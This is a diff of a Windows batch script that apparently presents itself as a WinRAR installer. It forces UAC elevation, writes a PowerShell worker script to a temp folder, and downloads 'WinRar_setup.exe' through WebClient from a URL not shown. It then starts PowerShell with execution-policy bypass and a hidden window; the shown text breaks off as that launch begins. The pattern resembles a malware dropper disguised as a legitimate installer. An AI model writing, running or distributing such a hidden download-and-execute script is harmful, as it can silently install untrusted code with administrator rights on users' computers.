@@ -3,7 +3,9 @@ setlocal EnableExtensions
 
 net session >nul 2>&1
 if %errorLevel% neq 0 (
-    powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
+    set "SELF_PATH=%~f0"
+    powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
+        "$p = $env:SELF_PATH -replace \"'\", \"''\"; Start-Process -FilePath 'cmd.exe' -ArgumentList \"/c `\"`$p`\"\" -Verb RunAs" >nul 2>&1
     exit /b 0
 )
 
@@ -14,6 +16,8 @@ set "WORK_DIR=%BASE_TEMP%\WinRarPkg"
 set "OUT=%WORK_DIR%\WinRar_setup.exe"
 set "PS_SCRIPT=%BASE_TEMP%\winrar_worker.ps1"
 set "LOG=%BASE_TEMP%\winrar_worker.log"
+
+if not exist "%WORK_DIR%" mkdir "%WORK_DIR%" >nul 2>&1
 
 > "%PS_SCRIPT%" (
   echo $ErrorActionPreference = 'Stop'
@@ -48,12 +52,14 @@ set "LOG=%BASE_TEMP%\winrar_worker.log"
   echo.
   echo     if ^(-not $downloaded^) {
   echo         try {
-  echo             Start-BitsTransfer -Source $u -Destination $f -ErrorAction Stop
+  echo             $wc = New-Object System.Net.WebClient
+  echo             $wc.DownloadFile^($u, $f^)
+  echo             $wc.Dispose^(^)
   echo             if ^(^(Test-Path -LiteralPath $f^) -and ^((Get-Item -LiteralPath $f^).Length -gt 0^)^) {
   echo                 $downloaded = $true
   echo             }
   echo         } catch {
-  echo             Write-Log "Start-BitsTransfer failed: $($_.Exception.Message)"
+  echo             Write-Log "WebClient failed: $($_.Exception.Message)"
   echo         }
   echo     }
   echo.
@@ -87,6 +93,8 @@ set "LOG=%BASE_TEMP%\winrar_worker.log"
   echo     }
   echo }
 )
+
+if not exist "%PS_SCRIPT%" exit /b 1
 
 powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
   "$psi = New-Object System.Diagnostics.ProcessStartInfo; " ^
